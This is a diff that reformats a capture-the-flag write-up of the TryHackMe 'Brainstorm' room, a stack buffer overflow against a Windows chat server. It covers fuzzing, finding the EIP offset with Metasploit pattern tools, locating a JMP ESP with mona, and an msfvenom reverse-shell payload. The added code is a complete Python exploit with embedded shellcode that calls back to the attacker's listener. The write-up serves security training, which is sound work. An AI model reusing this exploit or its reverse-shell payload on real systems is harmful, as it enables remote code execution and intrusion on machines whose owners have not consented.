@@ -95,7 +95,9 @@ For the exploitation phase, I will take you through writing a python exploit for
 
 The chat application asks us for a username of 20 characters, what if we supplied one of more than 20 characters? Let us see if we can trigger a crash in the application.
 
-`python3 -c “print(‘A’*100)”`
+```python3
+python3 -c "print(‘A’*100)"
+```
 
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/7.png#layoutTextWidth)
 
@@ -117,7 +119,9 @@ Run it by pressing the play button or F5 key.
 
 
 Let us test if we can reach the chatserver from our local machine
-`nc -nv <;windows IP>; 9999`
+```bash
+nc -nv <;windows IP>; 9999
+```
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/10.png#layoutTextWidth)
 
 
@@ -141,7 +145,9 @@ On immunity debugger, right click the ESP >; follow dump. Check the hex value fo
 
 
 Subtract to get the size of the buffer we sent. We then create a pattern of different ascii values using metasploit module and send that as the buffer
-`/usr/bin/msf-pattern_create -l 4088`
+```bash
+/usr/bin/msf-pattern_create -l 4088
+```
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/14.png#layoutTextWidth)
 
 
@@ -151,7 +157,9 @@ We get the crash in Immunity Debugger
 
 
 The value that overwrites the EIP is different from when we sent a bunch of As, this can help us determine where this value occurs within the buffer we sent. Copy the value and find the offset
-`/usr/bin/msf-pattern_offset -l 4088 -q 31704330`
+```bash
+/usr/bin/msf-pattern_offset -l 4088 -q 31704330
+```
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/16.png#layoutTextWidth)
 
 
@@ -176,7 +184,9 @@ We need to locate a JMP ESP instruction in memory that we will use to redirect t
 We can use the awesome mona python script to find the instruction
 
 [corelan/mona](https://github.com/corelan/mona)
-`!mona jmp -r esp`
+``` bash
+!mona jmp -r esp
+```
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/19.png#layoutTextWidth)
 
 
@@ -216,11 +226,65 @@ We don’t get bad characters in the hex dump.
 Since we are dealing with a windows executable, generate a shellcode specific to that using msfvenom
 
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/25.png#layoutTextWidth)
-`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.103 LPORT=4444 -e x86/shikata_ga_nai -f py -b &#34;\x00&#34;`
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.103 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
+```
 
 Copy the shellcode into our program. Our final script looks as follows
-`import socket``import struct``IP = &#34;192.168.0.104&#34;``PORT = 9999``s = socket.socket()``s.connect((IP,PORT))``username = b&#34;SAUDI&#34;``new_eip = struct.pack(&#34;<;I&#34;,0x62501503)``badchars = b&#34;&#34;.join([struct.pack(&#34;<;B&#34;,x)for x in range(1,256)])``buf =  b&#34;&#34;``buf += b&#34;\xbd\xaf\x88\xc7\xb6\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b&#34;``buf += b&#34;\xc9\xb1\x52\x31\x6e\x12\x83\xc6\x04\x03\xc1\x86\x25&#34;``buf += b&#34;\x43\xe1\x7f\x2b\xac\x19\x80\x4c\x24\xfc\xb1\x4c\x52&#34;``buf += b&#34;\x75\xe1\x7c\x10\xdb\x0e\xf6\x74\xcf\x85\x7a\x51\xe0&#34;``buf += b&#34;\x2e\x30\x87\xcf\xaf\x69\xfb\x4e\x2c\x70\x28\xb0\x0d&#34;``buf += b&#34;\xbb\x3d\xb1\x4a\xa6\xcc\xe3\x03\xac\x63\x13\x27\xf8&#34;``buf += b&#34;\xbf\x98\x7b\xec\xc7\x7d\xcb\x0f\xe9\xd0\x47\x56\x29&#34;``buf += b&#34;\xd3\x84\xe2\x60\xcb\xc9\xcf\x3b\x60\x39\xbb\xbd\xa0&#34;``buf += b&#34;\x73\x44\x11\x8d\xbb\xb7\x6b\xca\x7c\x28\x1e\x22\x7f&#34;``buf += b&#34;\xd5\x19\xf1\xfd\x01\xaf\xe1\xa6\xc2\x17\xcd\x57\x06&#34;``buf += b&#34;\xc1\x86\x54\xe3\x85\xc0\x78\xf2\x4a\x7b\x84\x7f\x6d&#34;``buf += b&#34;\xab\x0c\x3b\x4a\x6f\x54\x9f\xf3\x36\x30\x4e\x0b\x28&#34;``buf += b&#34;\x9b\x2f\xa9\x23\x36\x3b\xc0\x6e\x5f\x88\xe9\x90\x9f&#34;``buf += b&#34;\x86\x7a\xe3\xad\x09\xd1\x6b\x9e\xc2\xff\x6c\xe1\xf8&#34;``buf += b&#34;\xb8\xe2\x1c\x03\xb9\x2b\xdb\x57\xe9\x43\xca\xd7\x62&#34;``buf += b&#34;\x93\xf3\x0d\x24\xc3\x5b\xfe\x85\xb3\x1b\xae\x6d\xd9&#34;``buf += b&#34;\x93\x91\x8e\xe2\x79\xba\x25\x19\xea\x05\x11\x21\x8d&#34;``buf += b&#34;\xed\x60\x21\x40\xb2\xed\xc7\x08\x5a\xb8\x50\xa5\xc3&#34;``buf += b&#34;\xe1\x2a\x54\x0b\x3c\x57\x56\x87\xb3\xa8\x19\x60\xb9&#34;``buf += b&#34;\xba\xce\x80\xf4\xe0\x59\x9e\x22\x8c\x06\x0d\xa9\x4c&#34;``buf += b&#34;\x40\x2e\x66\x1b\x05\x80\x7f\xc9\xbb\xbb\x29\xef\x41&#34;``buf += b&#34;\x5d\x11\xab\x9d\x9e\x9c\x32\x53\x9a\xba\x24\xad\x23&#34;``buf += b&#34;\x87\x10\x61\x72\x51\xce\xc7\x2c\x13\xb8\x91\x83\xfd&#34;``buf += b&#34;\x2c\x67\xe8\x3d\x2a\x68\x25\xc8\xd2\xd9\x90\x8d\xed&#34;``buf += b&#34;\xd6\x74\x1a\x96\x0a\xe5\xe5\x4d\x8f\x15\xac\xcf\xa6&#34;``buf += b&#34;\xbd\x69\x9a\xfa\xa3\x89\x71\x38\xda\x09\x73\xc1\x19&#34;``buf += b&#34;\x11\xf6\xc4\x66\x95\xeb\xb4\xf7\x70\x0b\x6a\xf7\x50&#34;``shellcode = buf``NOP_sled = &#34;\x90&#34; * 15``s.send(username)``s.recv(1024)``total_length = 4088``offset = 2012``buffer = [``b&#34;A&#34; * offset,``new_eip,``NOP_sled,``shellcode,``b&#34;C&#34; *(total_length - offset - len(new_eip) - len(shellcode))``]``buffer = b&#34;&#34;.join(buffer)``s.send(buffer)`
-
+```python3
+import socket
+import struct
+IP = "192.168.0.104"
+PORT = 9999
+s = socket.socket()
+s.connect((IP,PORT))
+username = b"SAUDI"
+new_eip = struct.pack("<I",0x62501503)
+badchars = b"".join([struct.pack("<B",x)for x in range(1,256)])
+buf =  b""
+buf += b"\xbd\xaf\x88\xc7\xb6\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b"
+buf += b"\xc9\xb1\x52\x31\x6e\x12\x83\xc6\x04\x03\xc1\x86\x25"
+buf += b"\x43\xe1\x7f\x2b\xac\x19\x80\x4c\x24\xfc\xb1\x4c\x52"
+buf += b"\x75\xe1\x7c\x10\xdb\x0e\xf6\x74\xcf\x85\x7a\x51\xe0"
+buf += b"\x2e\x30\x87\xcf\xaf\x69\xfb\x4e\x2c\x70\x28\xb0\x0d"
+buf += b"\xbb\x3d\xb1\x4a\xa6\xcc\xe3\x03\xac\x63\x13\x27\xf8"
+buf += b"\xbf\x98\x7b\xec\xc7\x7d\xcb\x0f\xe9\xd0\x47\x56\x29"
+buf += b"\xd3\x84\xe2\x60\xcb\xc9\xcf\x3b\x60\x39\xbb\xbd\xa0"
+buf += b"\x73\x44\x11\x8d\xbb\xb7\x6b\xca\x7c\x28\x1e\x22\x7f"
+buf += b"\xd5\x19\xf1\xfd\x01\xaf\xe1\xa6\xc2\x17\xcd\x57\x06"
+buf += b"\xc1\x86\x54\xe3\x85\xc0\x78\xf2\x4a\x7b\x84\x7f\x6d"
+buf += b"\xab\x0c\x3b\x4a\x6f\x54\x9f\xf3\x36\x30\x4e\x0b\x28"
+buf += b"\x9b\x2f\xa9\x23\x36\x3b\xc0\x6e\x5f\x88\xe9\x90\x9f"
+buf += b"\x86\x7a\xe3\xad\x09\xd1\x6b\x9e\xc2\xff\x6c\xe1\xf8"
+buf += b"\xb8\xe2\x1c\x03\xb9\x2b\xdb\x57\xe9\x43\xca\xd7\x62"
+buf += b"\x93\xf3\x0d\x24\xc3\x5b\xfe\x85\xb3\x1b\xae\x6d\xd9"
+buf += b"\x93\x91\x8e\xe2\x79\xba\x25\x19\xea\x05\x11\x21\x8d"
+buf += b"\xed\x60\x21\x40\xb2\xed\xc7\x08\x5a\xb8\x50\xa5\xc3"
+buf += b"\xe1\x2a\x54\x0b\x3c\x57\x56\x87\xb3\xa8\x19\x60\xb9"
+buf += b"\xba\xce\x80\xf4\xe0\x59\x9e\x22\x8c\x06\x0d\xa9\x4c"
+buf += b"\x40\x2e\x66\x1b\x05\x80\x7f\xc9\xbb\xbb\x29\xef\x41"
+buf += b"\x5d\x11\xab\x9d\x9e\x9c\x32\x53\x9a\xba\x24\xad\x23"
+buf += b"\x87\x10\x61\x72\x51\xce\xc7\x2c\x13\xb8\x91\x83\xfd"
+buf += b"\x2c\x67\xe8\x3d\x2a\x68\x25\xc8\xd2\xd9\x90\x8d\xed"
+buf += b"\xd6\x74\x1a\x96\x0a\xe5\xe5\x4d\x8f\x15\xac\xcf\xa6"
+buf += b"\xbd\x69\x9a\xfa\xa3\x89\x71\x38\xda\x09\x73\xc1\x19"
+buf += b"\x11\xf6\xc4\x66\x95\xeb\xb4\xf7\x70\x0b\x6a\xf7\x50"
+shellcode = buf
+NOP_sled = "\x90" * 15
+s.send(username)
+s.recv(1024)
+total_length = 4088
+offset = 2012
+buffer = [
+b"A" * offset,
+new_eip,
+NOP_sled,
+shellcode,
+b"C" *(total_length - offset - len(new_eip) - len(shellcode))
+]
+buffer = b"".join(buffer)
+s.send(buffer)
+```
 Set up a netcat listener on our local machine listening on port 4444, send the payload.
 
 We get a reverse shell
@@ -228,7 +292,7 @@ We get a reverse shell
 ![image](/posts/2021-03-28_tryhackme-brainstorm/images/26.png#layoutTextWidth)
 
 
-**Getting the flag.**
+### Getting the flag
 
 Here we simply modify our target IP on the script to that of the remote IP in tryhackme.
 
